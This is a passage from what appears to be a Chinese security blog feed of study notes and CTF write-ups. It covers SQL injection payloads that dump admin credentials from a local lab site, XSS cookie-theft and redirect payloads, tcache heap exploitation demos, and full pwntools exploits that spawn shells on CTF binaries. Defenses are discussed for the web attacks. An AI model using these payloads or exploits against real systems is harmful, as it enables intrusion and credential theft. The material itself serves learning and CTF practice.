information_schema.schemata%23爆表名http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &quot;test&quot; %23爆列名http://localhost/sqli/Less-1/?id=1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &quot;hack&quot; %23爆内容http://localhost/sqli/Less-1/?id=1’ union select group_concat(id),group_concat(user),group_concat(pwd) from hack %23 Less-2]]></content>
      <tags>
        <tag>web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入和XSS的简单学习笔记]]></title>
    <url>%2F2018%2F11%2F13%2F2018-11-13-SQL%E6%B3%A8%E5%85%A5%E5%92%8CXSS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。 形成原因： web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查 漏洞复现平台 ： NPMserv 目标：NPMserv 中的一个政府网站 (本地搭的一个环境) 判断注入点 12http://127.0.0.1/info_show.php?info_id=140 and 1=1 有回显http://127.0.0.1/info_show.php?info_id=140 and 1=2 无回显 爆破字段数量 12http://127.0.0.1/info_show.php?info_id=140 order by 5这里数量，试了1到5都没问题，而6的话就会无回显，所以字段数量为5 判断可回显字段 12http://127.0.0.1/info_show.php?info_id=140 union select 1,2,3,4,5这里发现只有2，3字段是可以回显的 爆出敏感信息 123456789101112131415http://127.0.0.1/info_show.php?info_id=140 union select 1,user(),database(),4,5爆出了数据库用户名和数据库名，分别为root@localhost 和 govcnhttp://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=&quot;govcn&quot;爆出govcn数据库中包含的数据表，分别为admin，index_dy，index_info，index_intro，jgsz，ldjjgroup_concat函数用于把多条数据一次注出爆admin表的列名http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=&apos;admin&apos;爆出admin表中的列名为username,password爆用户和密码http://127.0.0.1/info_show.php?info_id=140 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin用unhex(hex())是为了解决网站编码不一致导致没有回显的问题用户名为admin，密码为：21232f297a57a5a743894a0e4a801fc3 这个是md5加密过的，拿去解密一下，解出来的内容为 admin。所以用户名为admin，密码为admin 利用注出的用户密码成功登入后台 至此，一个简单的SQL注入漏洞 就复现完了 SQL注入的防护手段 1对客户端提交的数据进行严格的校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。 2.对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。 3.采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。 4.避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。 5.严格执行数据库账号权限管理。 6.对用户敏感信息特别是密码做严格加密处理。 漏洞修复因为这个平台代码写的比较shi，本来想加上SQL预编译的，但是发现要改好多东西，所以就只针对漏洞点进行，修改。定位漏洞点，在info_show.php中 可以发现它直接用GET请求获得的参数进行SQL查询，对传入的参数并没有进行检查。所以我在这加入了一个检查，判断传入的参数是否为数字，如果不为数字，就强制转换成数字。 然后就ok了，补完洞了。再测试下，发现已经注入不了了。(也可能是我太菜了，才注不了，但是不管了，假装补上了) XSS跨站脚本攻击原理 攻击者在被攻击的Web服务器网页中嵌入恶意脚本，通常是用JavaScript编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。 类型 反射型 XSS 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 持久型 XSS 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 DOM XSS DOM-based XSS漏洞是基于文档对象模型Document Objeet Model 的一种漏洞。DOM是一个与平台、编程语言无关的借口，它允许程序或脚本动态的访问或者更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些事用户可以操作的.客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格的确认，就会产生DOM-based XSS漏洞。 漏洞复现平台 ： NPMserv 目标：NPMserv 中的博客网站 (本地搭的一个环境) 寻找漏洞点，这些博客的网站，xss一般存在于留言板中。而这个博客系统中每篇文章下都可以留言，并且有留言本。 先测试下文章的留言功能 发现输入的js代码被执行了，所以这里存在一个xss漏洞，并且是个反射型的xss漏洞 然后测试下留言本，很明显，这里也存在XSS漏洞，并且这个是个存储型的XSS漏洞，我输入的语句直接插入到网站上，只要用户访问了这个网站，那么我输入的代码就会被执行。 这个可以拿来做很多事情，比如 Cookie窃取 会话劫持 网页挂马 DOS和DDOS XSS蠕虫 简单演示下 Cookie窃取 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 嵌入网页 123&lt;iframe src= http://www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;&lt;iframe src= http://www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;可以通过设置嵌入网页的高宽来隐藏它 页面跳转 12&lt;script&gt;location=&quot;http://www.baidu.com&quot;&lt;/script&gt;#直接劫持页面 防御手段XSS攻击防御的核心思想就是对输入输出进行过滤和数据转义 过滤： 过滤不安全的标签，如script, style, link, iframe, frame。 过滤字符串中的 反斜杠 转义 针对&lt;、&gt;、/、’、”、&amp;五个字符进行实体化转义。 文章评论漏洞 漏洞修复：将$comment[‘content’] 的值经过htmlspecialchars函数处理，htmlspecialchars()函数可以把&amp; （和号）、“（双引号）、‘（单引号）、&lt;（小于）、&gt;（大于）这些敏感符号都转换为html实体。 测试，XSS漏洞修复了 留言版漏洞，这是一个存储型XSS漏洞，审查代码，定位漏洞点 可以发现它对提交的变量没有进行过滤就插入数据库了 漏洞修补：在add函数里加入htmlspecialchars函数，对传入的变量进行转义 然后就搞定了，之前的XSS漏洞不可以用了 reference： SQL注入攻击方式及防御方法，手把手入门白帽子 （二) CTF-Wiki]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【上海市大学生网络安全大赛】pwn复现]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 12zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped 这是一道aarch64的pwn题，我之前ubuntu的环境有点小问题，所以我配了一个deepin的环境搭建教程 安装下共享库 12345678zs0zrc@zs0zrc-PC:~/pwn/babyarm$ apt-cache search "libc6" | grep arm libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)zs0zrc@zs0zrc-PC:~/pwn/babyarm$ sudo apt-get install libc6-arm64-cross 用ida反编译了下文件，发现漏洞点很明显，就是一个栈溢出 123456789101112131415__int64 sub_400818()&#123; sub_400760(); write(1, "Name:", 5uLL); read(0, &amp;unk_411068, 0x200uLL); sub_4007F0(); return 0LL;&#125;ssize_t sub_4007F0()&#123; __int64 v1; // [xsp+10h] [xbp+10h] return read(0, &amp;v1, 0x200uLL); //stack overflow&#125; 程序先向bss段写入内容，然后再读取一个字符串，很明显这应该是用rop来做，但是我arm64的rop不是很会，arm64的汇编不是很懂，找不到gadget，就 …….. 这里看了大佬的writeup，发现是用rop做，先利用rop执行mprotect函数，设置bss段为可执行，往bss段写入shellcode，然后去执行shellcode来getshell 这里找的gadget类似于万用gadget 先学习下amd64常用汇编指令 123456789101112131415MOV X1，X0 ;将寄存器X0的值传送到寄存器X1ADD X0，X1，X2 ;寄存器X1和X2的值相加后传送到X0SUB X0，X1，X2 ;寄存器X1和X2的值相减后传送到X0AND X0，X0，#0xF ; X0的值与0xF相位与后的值传送到X0ORR X0，X0，#9 ; X0的值与9相位或后的值传送到X0EOR X0，X0，#0xF ; X0的值与0xF相异或后的值传送到X0LDR X5，[X6，#0x08] ；X6寄存器加0x08的和的地址值内的数据传送到X5STR X0, [SP, #0x8] ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间STP x29, x30, [sp, #0x10] ;入栈指令LDP x29, x30, [sp, #0x10] ;出栈指令CBZ ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）CMP ;比较指令，相当于SUBS，影响程序状态寄存器CPSR B/BL ;绝对跳转#imm， 返回地址保存到LR（X30）RET ;子程序返回指令，返回地址默认保存在LR（X30） 然后分析下这个gadget，通过loc_4008CC 函数，可以控制x19,x20,x21,x22,x23,x24,x29和x30寄存器的内容，而x30寄存器存储着返回地址，通过loc_4008AC函数，可以控制w0,x1,x2,x3寄存器的内容，并且可以执行call x3 12345678910111213141516loc_4008AC ; CODE XREF: sub_400868+60↓j LDR X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器 MOV X2, X22 ;将x22寄存器的内容赋给x2 MOV X1, X23 ;将x23寄存器的内容赋给x1 MOV W0, W24 ;将W24寄存器的内容赋给W0 ADD X19, X19, #1 ;x19寄存器加一 BLR X3 ；跳转到x3寄存器指向的地址 CMP X19, X20 ；比较x19和x20是否相等 B.NE loc_4008AC ；如果不相等，就跳回loc_4008AC继续执行loc_4008CC ; CODE XREF: sub_400868+3C↑j LDP X19, X20, [SP,#0x10] ;将sp+0x10,sp+0x18处的内容给x19,x20 LDP X21, X22, [SP,#0x20] ;将sp+0x20,sp+0x28处的内容给x21,x22 LDP X23, X24, [SP,#0x30] ;将sp+0x30,sp+0x38处的内容给x23,x24 LDP X29, X30, [SP],#0x40 ;将sp,sp+0x8处的内容给x29,x30 RET 布置好的栈如下，在执行完loc_4008CC 函数后，x30为loc_4008AC 的地址，所以程序会跳转到loc_4008AC 函数，会将x21寄存器的地址指向的内容赋给x3寄存器，然后将对应的参数放入x0,x1,x2寄存器中，接着会执行blr x3语句，这相当于 call x3，所以就会调用构造好的mprotect(0x411000,0x1000,0x5)函数，调用完mprotect函数后会将继续向下执行，比较x19和x20是否相等，这里提前构造好，使它们相等，然后继续向下执行。执行一连串的ldp指令后，将shellcode的地址赋给x30,那么最后就会ret到shellcode处去执行它。 12345678910111200:0000│ sp 0x40007ffe40 ◂— 0x0 --&gt; x2901:0008│ 0x40007ffe48 —▸ 0x4008ac ◂— ldr x3, [x21, x19, lsl #3] --&gt; x3002:0010│ 0x40007ffe50 ◂— 0x0 --&gt; x19 03:0018│ 0x40007ffe58 ◂— 0x1 --&gt; x2004:0020│ 0x40007ffe60 —▸ 0x411168 —▸ 0x400600 (mprotect@plt) --&gt; x21 --&gt;x305:0028│ 0x40007ffe68 ◂— 0x5 --&gt; x22 --&gt;x206:0030│ 0x40007ffe70 ◂— 0x1000 --&gt;x23 --&gt;x107:0038│ 0x40007ffe78 —▸ 0x411000 --&gt;x24--&gt;w008:0040│ 0x40007ffe80 ◂— 0x0 09:0048│ 0x40007ffe88 —▸ 0x411068 --&gt;下一个x30,shellcode的地址0a:0050│ 0x40007ffe90 ◂— 0xdeadbeef *6 ........... 这里用pwntools生成aarch64的shellcode会报错 解决方法(Ubuntu下) 1234$ sudo apt-get install software-properties-common$ sudo apt-add-repository ppa:pwntools/binutils$ sudo apt-get update$ sudo apt-get install binutils-aarch64-linux-gnu exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env pythonfrom pwn import *local=0debug = 0if local: p = remote("106.75.126.171","33865")elif debug: p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "pwn"]) else: p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "pwn"])elf = ELF("pwn")context.binary = "pwn"context.log_level = "debug"def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) buf = asm(shellcraft.aarch64.sh())buf = buf.ljust(0x100,'\x00')buf += p64(0x400600) #这里是存放mprotect函数的地址size = 72gadget1 = 0x4008CCgadget2 = 0x4008ACshellcode_add = 0x411068mprotect_add = 0x411168payload = cyclic(72) + flat([gadget1 , 0 , gadget2 , 0 , 1 , mprotect_add , 5 , 0x1000 , 0x411000 , 0 , shellcode_add] , [0xdeadbeef]*6)rc()sl(buf)sl(payload)p.interactive() momo_serve]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arm-pwn环境搭建]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[最近打的比赛，做arm-pwn发现自己环境有点问题，就像新搭一个基于deepin系统的环境，下面记录下搭环境的过程 镜像 先装好deepin虚拟机，然后开始配环境 基本环境的安装 gdb-multiarch, git , vim, gdb ,binfmt 用来 识别文件格式 123sudo apt-get updatesudo apt-get install git gdb gdb-multiarch vimsudo apt-get install &quot;binfmt*&quot; 安装gef 12wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.pyecho source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit 安装pip，pwntools 12345wget https://bootstrap.pypa.io/get-pip.pysudo python get-pip.pysudo apt-get install python-devsudo pip install pwntools 安装qume 1sudo apt-get install qemu-user 然后环境基本就搞定了，剩下的共享库，需要安装什么就安装什么，我另一篇博客有讲过，这里就不讲了。 reference: D4rk3r 师傅的博客 M4X师傅]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache下的堆利用的学习]]></title>
    <url>%2F2018%2F10%2F30%2F2018-10-30-tcache%E4%B8%8B%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近做国际赛的题，遇到了tcache下的堆利用，之前没有接触过tcache机制，所以就来学习一下，主要是围绕howtoheap来学习，做下笔记。 tcache机制是glibc-2.26新增的机制，主要是用来提升堆管理的性能，但是它的安全机制几乎没有….所以搞事就容易很多了，混子pwn手的福音 基础知识tcache的两个新增的结构体 12345678910typedef struct tcache_entry //tcache_entry 是用来链接chunk的结构体，*next指向下一个chunk的 &#123; //user data struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct //tcache的管理结构，一共有64项entries&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; 一些新增的宏 123456789101112131415//tcache新增的宏#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64 //tcache entries的数量# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1) //tcache的最大大小/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When "x" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When "x" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 //一个entry最多可以有7个chunk#endif 源码分析我就不写了，懒~，大佬们写的都很详细了 M4X大佬博客 P4nda大佬 tcache_poisoning通过覆盖tcache_entry中的 next指针，实现任意地址分配。因为tcache_get函数没有安全性检查机制 12345678910static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next;//基本什么检查都没有 --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 源码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123; size_t stack_var; fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&amp;stack_var); fprintf(stderr, "Allocating 1 buffer.\n"); intptr_t *a = malloc(128); fprintf(stderr, "malloc(128): %p\n", a); fprintf(stderr, "Freeing the buffer...\n"); free(a); fprintf(stderr, "Now the tcache list has [ %p ].\n", a); fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n" "to point to the location to control (%p).\n", sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, "1st malloc(128): %p\n", malloc(128)); fprintf(stderr, "Now the tcache list has [ %p ].\n", &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, "2nd malloc(128): %p\n", b); fprintf(stderr, "We got the control\n"); return 0;&#125; 运行结果： 123456789101112zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_poisoning The address we want malloc() to return is 0x7ffe8a1508e0.Allocating 1 buffer.malloc(128): 0x562bb17cd260Freeing the buffer...Now the tcache list has [ 0x562bb17cd260 ].We overwrite the first 8 bytes (fd/next pointer) of the data at 0x562bb17cd260to point to the location to control (0x7ffe8a1508e0).1st malloc(128): 0x562bb17cd260Now the tcache list has [ 0x7ffe8a1508e0 ].2nd malloc(128): 0x7ffe8a1508e0We got the control 这个程序先分配了一个大小128的chunk，然后将它free掉。此时这个chunk会被放入tcache中，然后修改它的next字段，修改为一个栈上变量的地址。最后在分配两次128大小的chunk，就可以控制栈上的内容了。 tcache_dup这个这是效果和double free差不多，但是比glibc_2.25版本简单，直接free两次就好了，因为tcache_put也没什么检查机制 123456789static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; how2heap例子 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n"); fprintf(stderr, "Allocating buffer.\n"); int *a = malloc(8); fprintf(stderr, "malloc(8): %p\n", a); fprintf(stderr, "Freeing twice...\n"); free(a); free(a); fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a); fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8)); return 0;&#125; 运行结果: 1234567zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_dup This file demonstrates a simple double-free attack with tcache.Allocating buffer.malloc(8): 0x5595e067f260Freeing twice...Now the free list has [ 0x5595e067f260, 0x5595e067f260 ].Next allocated buffers will be same: [ 0x5595e067f260, 0x5595e067f260 ]. free两次后tcache的情况 house_of_spirit这个主要是由于tcache_put函数没有对chunk的前后chunk的有效性进行检查，所以只要构造好本块对齐的chunk就可以free掉放入tcache中。 前提：(x64位下) ps：free掉的地址是伪造的chunk的user_data地址，和之前还是有点不同的 伪造的size&lt;= 0x410 malloc的大小 &lt;= 0x408 源码： 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region malloc(1);//init heap fake_chunks[1] = 0x40; // this is the size fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]); fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"); a = &amp;fake_chunks[2]; fprintf(stderr, "Freeing the overwritten pointer.\n"); free(a); fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));&#125; free掉伪造的chunk后堆的情况 reference: M4X’s blog P4nda CTF-WIKI tcache_source_code]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>housetoheap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BSides Delhi CTF 2018 writeup]]></title>
    <url>%2F2018%2F10%2F27%2F2018-10-27-BSides-Delhi-CTF-2018-writeup%2F</url>
    <content type="text"><![CDATA[easypeasy防护机制： 1234567☁ easy checksec easypeasy [*] &apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 简单的运行了下，好像是让我们输入寄存器的值，一直循环输入 简单逆向下，程序主要逻辑在child函数中。 12345678910111213141516171819202122232425262728293031323334353637383940414243void __noreturn child()&#123; __int64 buf[7]; // [rsp+0h] [rbp-40h] unsigned __int64 v1; // [rsp+38h] [rbp-8h] v1 = __readfsqword(0x28u); signal(14, (__sighandler_t)handler); while ( 1 ) &#123; do &#123; get_obj(buf); obj = buf[0]; qword_6010A8 = buf[1]; qword_6010B0 = buf[2]; qword_6010B8 = buf[3]; qword_6010C0 = buf[4]; qword_6010C8 = buf[5]; qword_6010D0 = buf[6]; &#125; while ( (unsigned int)validate_syscall_obj(buf[0]) ); raise(14); &#125;&#125;__int64 __fastcall get_obj(_QWORD *buf)&#123; printf("RAX: "); *buf = get_ll(); printf("RDI: "); buf[1] = get_ll(); printf("RSI: "); buf[2] = get_ll(); printf("RDX: "); buf[3] = get_ll(); printf("RCX: "); buf[4] = get_ll(); printf("R8: "); buf[5] = get_ll(); printf("R9: "); buf[6] = get_ll(); return 0LL;&#125; singal()函数声明void (signal(int sig, void (func)(int)))(int) ，第一个参数为要处理的信号，第二个参数为处理方法 raise()函数声明int raise(int sig) 这里参数为要发送的信号码，这个函数会促使生成信号sig 这里用signal函数给信号14也就是SIGALRM信号 设置了一个处理方法，然后循环读取寄存器的值，将这些值存入bss段上的变量中，每读取完一次后调用一次validate_syscall_obj函数，如果validate_syscall_obj函数返回值为0，就调用raise(14)函数,生成信号SIGALRM。然后就会调用handler函数，否则就进行下一次循环。如果想调用handler函数，那么rax的值就必须为1，2，3，60这四个数中的一个，或者是等30秒，程序调用alarm函数。 贴下linux支持的信号表： 12345678910111213141516171819202122Linux支持的信号列表如下。很多信号是与机器的体系结构相关的信号 信号值 默认处理动作 发出信号的原因SIGHUP 1 A 终端挂起或者控制进程终止SIGINT 2 A 键盘中断（如break键被按下）SIGQUIT 3 C 键盘的退出键被按下SIGILL 4 C 非法指令SIGABRT 6 C 由abort(3)发出的退出指令SIGFPE 8 C 浮点异常SIGKILL 9 AEF Kill信号SIGSEGV 11 C 无效的内存引用SIGPIPE 13 A 管道破裂: 写一个没有读端口的管道SIGALRM 14 A 由alarm(2)发出的信号SIGTERM 15 A 终止信号SIGUSR1 30,10,16 A 用户自定义信号1SIGUSR2 31,12,17 A 用户自定义信号2SIGCHLD 20,17,18 B 子进程结束信号SIGCONT 19,18,25 进程继续（曾被停止的进程）SIGSTOP 17,19,23 DEF 终止进程SIGTSTP 18,20,24 D 控制终端（tty）上按下停止键SIGTTIN 21,21,26 D 后台进程企图从控制终端读SIGTTOU 22,22,27 D 后台进程企图从控制终端写 handler函数 123456789101112131415161718192021222324252627void handler()&#123; exec_syscall_obj(&amp;obj);&#125;__int64 __fastcall exec_syscall_obj(_QWORD *a1)&#123; _QWORD *v1; // rbx __int64 result; // rax __int64 v3; // rdi __int64 v4; // rsi __int64 v5; // rdx __int64 v6; // rcx __int64 v7; // r8 __int64 v8; // r9 v1 = a1; result = *a1; v3 = a1[1]; v4 = v1[2]; v5 = v1[3]; v6 = v1[4]; v7 = v1[5]; v8 = v1[6]; __asm &#123; syscall; LINUX - &#125; return result;&#125;//exec_syscall_obj就是根据输入的寄存器的值执行了一次syscall 做法一: 构造execve(“/bin/sh”,0,0)的syscall来getshell 做法二： 构造open(),read(),write()这三个函数的系统调用，打开flag文件，读取flag，再打印出来 ps：这是我看大佬的writeup看到的 大佬博客地址 大佬都是手撕汇编的存在。tkbl open的系统调用号为 2，write的调用号为1，read的调用号为0 寄存器对应参数 open： rax-&gt; 0x2 ; rdi-&gt;pathname ; rsi​-&gt;flags read: rax-&gt;0x0 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count write: rax-&gt;0x1 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count 先通过调用read的syscall将 pathname写入bss段，然后用open打开文件，再通过read将文件内容读到bss段，最后通过write打印出来 我用的是做法一： execve()的syscall rax : 0x3b rdi : address of “/bin/sh\x00” rsi : 0 rdx : 0 exp: 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./easypeasy') elf = ELF('./easypeasy')else: p = remote("35.200.228.122",1337) elf = ELF('./easypeasy')context.arch = elf.archcontext.log_level='debug' def register(rax,rdi,rsi,rdx,rcx,r8,r9): p.sendlineafter('RAX: ', rax) p.sendlineafter('RDI: ', rdi) p.sendlineafter('RSI: ', rsi) p.sendlineafter('RDX: ', rdx) p.sendlineafter('RCX: ', rcx) p.sendlineafter('R8: ', r8) p.sendlineafter('R9: ', r9)register(str(0x3b),str(0x6010A0 + 0x30),str(0x0),str(0x0),str(0),str(0),str(u64('/bin/sh\x00')))sleep(30) #这里sleep(30)的原因是为了等程序执行 alarm(0x1e)，产生SIGALRM信号p.interactive() canarysmash the stack，利用__stack_chk_failed函数，打印出flag exp： 123456789101112from pwn import*#p = process('./canary')p = remote("35.200.232.80","1337")context.log_level="debug"flag = 0x06010A0p.recv()payload = 'a'*0x178 + p64(flag)p.sendline(payload)p.recv()p.interactive() data_bank防护机制： 1234567☁ data_bank checksec data_bank [*] &apos;/home/zs0zrc/pwn/ BSides/data_bank/data_bank&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这道题是一道堆的UAF的利用，但是libc版本是2.26，有tcache机制…….做的时候没有发现，虽然他给了libc文件，但是没有去检查libc的版本，下次一定记得去检查libc版本。而且不知道为什么我Ubuntu16.04不能运行他给的libc文件，所以我用的环境是Ubuntu18.04 程序一共有5个功能 add 新建一个chunk edit 编辑chunk delete free掉一个chunk，但是没有将指针置为空 view 将chunk的内容打印出来 exit 退出 漏洞点 1234567891011121314151617181920212223int delete()&#123; int result; // eax int v1; // eax signed int v2; // [rsp+Ch] [rbp-4h] puts("Enter the index:"); result = get_int(); v2 = result; while ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 6 ) &#123; if ( !table[v2] ) return puts("The index is empty"); v1 = count--; if ( v1 ) &#123; free(table[v2]);//存在UAF漏洞 return puts("done"); &#125; result = puts("Sorry no more removal\n"); &#125; return result;&#125; 利用思路： 先利用view功能泄露出libc地址，然后通过UAF 加上tcache_posion分配到包含_malloc_hook的chunk，修改 __malloc_hook为one_gadget，最后再malloc一个chunk触发 malloc_hook来getshell。这里要注意的是因为有tcache机制，所以要先将tcache填满，才可以泄露出地址。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import*context.log_level = "debug"p = process("./data_bank", env = &#123;'LD_PRELOAD': './libc.so.6'&#125;)elf = ELF('./data_bank')libc = ELF('./libc.so.6')def add(idx,size,data): p.sendlineafter("&gt;&gt; ","1") p.sendlineafter("Enter the index:\n",str(idx)) p.sendlineafter("Enter the size:\n",str(size)) p.sendlineafter("Enter data:\n",data) def delete(idx): p.sendlineafter("&gt;&gt; ","3") p.sendlineafter("Enter the index:\n",str(idx)) def edit(idx,data): p.sendlineafter("&gt;&gt; ","2") p.sendlineafter("Enter the index:\n",str(idx)) p.sendlineafter("Please update the data:\n",data) def show(idx): p.sendlineafter("&gt;&gt; ","4") p.sendlineafter("Enter the index:\n",str(idx)) add(0,0x80,'a'*0x80)add(1,0x80,'b'*0x80)for i in range(7): # 填满tcache delete(1)delete(0)show(0)p.recvuntil(":")leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak - 0x3ebca0libc.address = libc_base__malloc_hook_add = libc.symbols['__malloc_hook']one_gadget = libc_base + 0x10a38clog.info("libc_address 